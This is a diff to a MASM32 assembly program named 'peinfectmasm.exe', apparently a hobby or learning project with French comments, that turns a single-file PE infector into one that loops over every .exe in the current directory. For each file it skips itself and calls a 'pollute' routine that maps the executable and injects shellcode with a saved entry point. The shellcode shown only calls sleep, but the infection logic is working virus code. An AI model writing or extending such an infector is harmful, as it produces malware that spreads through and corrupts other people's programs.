@@ -20,11 +20,15 @@ includelib	c:\masm32\lib\msvcrt.lib
 
 .data
 
+lpFileName									db	"*.exe", 0
+infectorName									db "peinfectmasm.exe",0
+
 ;shellcode sleep(4919)
 shellcode 										db 33h, 192, 66h, 184,37h, 13h, 50h , 184, 42h, 24h, 80h, 7ch,  255, 208,  233,0 
 patOnError 									db "Error code: ", 0
 patOnSuccess 									db "Success", 13, 10, 0
-patNameOfFile									db "Polluting file: ", 0
+patOnFinish 									db "Finish", 13, 10, 0
+patNameOfFile									db "Polluting file: %s",13,10,0
 patNewLine									db 13,10,0
 patDebug										db "--DEBUG--", 13, 10, 0
 patAddrImageDosHeader							db "Address of IMAGE DOS HEADER: ", 0
@@ -56,6 +60,10 @@ shellcodeNop									db 90h, 0
 
 .data?
 
+lpFindFileData WIN32_FIND_DATA <>	
+
+hFile dd ?
+
 ;infosExecutable dd ? 
 infosPE    										dd ?
 sectionSize 									dd ?
@@ -80,29 +88,50 @@ sizeDifference									dd ?
 
 .code
 start:
-
 ;long sectionSize = strlen(shellcode) + (sizeof(DWORD)); 
 ;size du shellcode +  old entrypoint  
-
 push	offset shellcode
 call		crt_strlen
 mov	sectionSize , eax
 add		sectionSize, sizeof DWORD
 
-push	offset filename
+;; Recuperation du premier fichier
+invoke	FindFirstFile,  offset lpFileName,  offset lpFindFileData
+mov	hFile, eax
+cmp	hFile, 0
+je		exit
+jmp		initPollute
+
+nextFile:
+invoke	FindNextFile,  hFile,  offset lpFindFileData
+cmp	eax, 0
+je		exit
+jmp		initPollute
+
+initPollute:
+; test anti atuo-infection
+invoke	crt_strcmp, offset lpFindFileData.cFileName, offset infectorName
+cmp	eax, 0
+je		nextFile
+invoke	crt_printf, offset patNameOfFile, offset lpFindFileData.cFileName
+; Appel de l'infecteur
+push	offset lpFindFileData.cFileName
 call		pollute
 cmp	eax, 0
-jne		exiterror
-
-exit:
+jne		steperror
 invoke	crt_printf,  offset patOnSuccess
+jmp		nextFile
+	
+	
+exit:
+invoke	crt_printf,  offset patOnFinish
 invoke	ExitProcess, 0
 
-exiterror:
+steperror:
 invoke	crt_printf,  offset patOnError
 call		GetLastError
 invoke	crt_printf, offset patPutInt, eax
-invoke	ExitProcess, 1
+jmp		nextFile
 
 ;seems to work one shot \o/, to verify
 alignOn	proc alignment: DWORD, value: DWORD 
@@ -125,9 +154,10 @@ alignOn	endp
 pollute	proc filename1 : DWORD
 
 ;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; invoke	crt_printf, offset patNameOfFile
-; invoke	crt_printf, filename1
-; invoke	crt_printf, offset patNewLine
+;; Segfault changement de la string patNameOfFile
+;invoke	crt_printf, offset patNameOfFile
+;invoke	crt_printf, filename1
+;invoke	crt_printf, offset patNewLine
 ;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;saving non rdy for use registers
 push	ebx
@@ -145,14 +175,14 @@ je		exitpolluteerror
 invoke	CreateFileMapping,  executableHandle, 0, PAGE_READWRITE, 0, 0, 0
 mov	executableMap, eax
 cmp	eax,  INVALID_HANDLE_VALUE
-je		exiterror
+je		steperror
 cmp	eax, NULL
 je		exitpolluteerror
 
 invoke	MapViewOfFile, executableMap, FILE_MAP_ALL_ACCESS, 0, 0, 0
 mov	executableEnMemoire, eax
 cmp	eax, NULL
-je		exiterror
+je		steperror
 
 
 
